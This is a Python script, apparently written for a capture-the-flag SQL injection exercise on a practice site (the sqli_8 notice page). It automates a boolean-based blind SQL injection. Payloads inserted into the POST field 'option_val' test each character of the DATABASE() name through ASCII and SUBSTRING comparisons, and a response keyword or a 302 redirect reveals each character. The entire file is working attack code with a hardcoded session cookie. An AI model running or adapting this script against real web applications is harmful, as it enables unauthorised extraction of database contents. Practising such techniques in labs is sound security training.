import requests

# 사이트 주소
url = "http://ctf2.segfaulthub.com:7777/sqli_8/notice_read.php"
#charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}"
DB_len = 30
true_val="username"
keyword = "dkanrjsk"

DB_name = ""

for i in range(1,DB_len+1):  # DB 이름 최대 30자까지
    found = False
    for char_code in range(32,127):
        # 페이로드 작성 (자동으로 url 인코딩 해줌)
        payload = f"{true_val}' AND ASCII(BINARY SUBSTRING(DATABASE(),{i},1))={char_code} AND '1'='1"
        
        payload2= f"1=1 and ASCII(BINARY SUBSTRING(DATABASE(),{i},1))={char_code} AND {true_val}"
        
        cookies = {
            'PHPSESSID' : "d8h9qc4tdp2fdrq148vhectbpe"
        }

        # GET 메서드 & 파라미터 설정
        # params={
            
        # }

        # response = requests.get(url, cookies=cookies)


        # POST 메서드 & 파라미터명 설정
        data = {
            'option_val': payload2,
            'board_result' : "dk",
            'board_search': "%F0%9F%94%8D",
            'date_from': "",
            'date_to' : ""
        }

        response = requests.post(url,data=data, cookies=cookies, allow_redirects=False)
        
        # 분별할 키워드
        if keyword :
            if keyword in response.text:
                DB_name += chr(char_code)
                print(f"[+] Found character {i}: {chr(char_code)}")
                found = True
                break
        elif response.status_code == 302:
            DB_name += chr(char_code)
            print(f"[+] Found character {i}: {chr(char_code)}")
            found = True
            break

    if not found:
        print(f"[-] Position {i}: no matching character found. Stopping.")
        break

print(f"[✅] 추출된 DB 이름: {DB_name}")